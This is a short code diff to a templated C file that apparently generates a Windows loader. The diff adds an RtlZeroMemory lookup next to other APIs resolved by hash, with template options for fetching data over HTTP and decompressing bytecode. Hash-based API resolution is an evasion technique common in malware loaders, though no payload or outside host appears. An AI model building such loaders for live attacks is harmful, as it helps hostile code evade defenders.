@@ -17,6 +17,7 @@ typedef BOOL (WINAPI *pCloseDecompressor)(DECOMPRESSOR_HANDLE);
 typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
 {% if data_source == 'http' %}
 typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
 typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
@@ -49,6 +50,7 @@ pCreateFileA pfnCreateFileA;
 pGetFileSize pfnGetFileSize;
 pReadFile pfnReadFile;
 pRtlMoveMemory pfnRtlMoveMemory;
+pRtlZeroMemory pfnRtlZeroMemory;
 {% if data_source == 'http' %}
 pWinHttpOpen pfnWinHttpOpen;
 pWinHttpConnect pfnWinHttpConnect;
@@ -157,6 +159,7 @@ void ResolveAPIs() {
 
     if (hNtdll != NULL) {
         pfnRtlMoveMemory = (pRtlMoveMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
+        pfnRtlZeroMemory = (pRtlZeroMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlzeromemory }});
     }
 
     {% if bytecode_compression == 'mszip_compressor' %}
